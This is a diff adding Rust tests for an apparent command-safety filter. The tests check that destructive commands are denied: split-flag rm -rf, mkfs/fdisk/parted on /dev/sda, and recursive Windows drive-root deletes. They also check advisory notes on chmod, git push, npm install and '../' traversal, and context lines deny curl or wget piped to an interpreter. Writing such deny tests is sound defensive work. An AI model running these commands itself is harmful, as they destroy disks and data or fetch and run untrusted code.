@@ -476,3 +476,72 @@ fn fetch_piped_to_windows_interpreter_is_denied() {
     assert!(denied("curl -sSL https://example.com/x | pwsh -"));
     assert!(denied("wget -O- https://example.com/x | cmd"));
 }
+
+/// Split short flags (`-r -f`) must deny like the bundled spelling (`-rf`),
+/// and the single-letter `-f` beside a LONG `--recursive` is the load-bearing
+/// case: flipping `has_flag`'s char comparison to `!=` makes a single-letter
+/// bundle report its own flag as absent, and every two-short-flag spelling
+/// masks that by cross-matching (`-f` satisfies the mutated 'r' scan, `-r`
+/// satisfies the mutated 'R' scan). Only a lone short flag with no sibling
+/// bundle to borrow from tells the two comparisons apart.
+#[test]
+fn split_short_flags_still_deny_rm() {
+    assert!(denied("rm -r -f /tmp/x"));
+    assert!(denied("rm -f -r /tmp/x"));
+    assert!(denied("rm --recursive -f /tmp/x"));
+    assert!(denied("rm -r --force /tmp/x"));
+}
+
+/// The disk-destruction arm, exercised spelling by spelling. The whole match
+/// arm (`mkfs | fdisk | parted`) and the `mkfs.*` guard were deletable with
+/// every test green — the floor's most catastrophic entries had no pin.
+#[test]
+fn disk_formatting_and_partitioning_are_denied() {
+    assert!(denied("mkfs /dev/sda"));
+    assert!(denied("fdisk /dev/sda"));
+    assert!(denied("parted /dev/sda"));
+    assert!(denied("mkfs.ext4 /dev/sda"));
+}
+
+/// Recursive drive-root deletes on the Windows spellings, plus the shapes
+/// around the drive-letter parse: `C:` (empty remainder — the `||` that made
+/// it denied was collapsible to `&&` with every test green), and a
+/// one-character relative target (the `len >= 2 &&` bound — collapsed to
+/// `||` it indexes past a one-byte string). Recursive deletes of ordinary
+/// relative targets stay allowed: the floor names catastrophes only, and
+/// non-recursive `del` is out of scope by design (see the arm's doc).
+#[test]
+fn recursive_drive_root_deletes_are_denied_and_relative_ones_are_not() {
+    assert!(denied("del /s /q C:"));
+    assert!(denied("del /s /q C:\\"));
+    assert!(!denied("del /s /q f"));
+    assert!(!denied("del /s /q build\\out.txt"));
+}
+
+fn note_reasons(command: &str) -> Vec<TextId> {
+    safety_notes(command)
+        .iter()
+        .map(|note| note.reason)
+        .collect()
+}
+
+/// Each advisory arm pinned by presence AND absence, so a deleted arm or a
+/// widened/narrowed guard names itself: chmod/chown carry the permission
+/// note; git notes fire for remote subcommands only; installer notes fire for
+/// `npm install`; and the suspicious-path note fires on EITHER signal
+/// (absolute path, `..` traversal) — the `||` there was collapsible to `&&`
+/// with every test green.
+#[test]
+fn safety_note_arms_are_pinned_each_way() {
+    assert!(note_reasons("chmod 644 notes.txt").contains(&TextId::SafetyChmodReason));
+    assert!(note_reasons("chown me notes.txt").contains(&TextId::SafetyChmodReason));
+
+    assert!(note_reasons("git push origin main").contains(&TextId::SafetyGitRemoteReason));
+    assert!(!note_reasons("git status").contains(&TextId::SafetyGitRemoteReason));
+
+    assert!(note_reasons("npm install left-pad").contains(&TextId::SafetyInstallReason));
+    assert!(!note_reasons("npm run build").contains(&TextId::SafetyInstallReason));
+
+    assert!(note_reasons("cat /etc/hosts").contains(&TextId::SafetyPathOutsideReason));
+    assert!(note_reasons("cat ../secrets.txt").contains(&TextId::SafetyPathOutsideReason));
+}
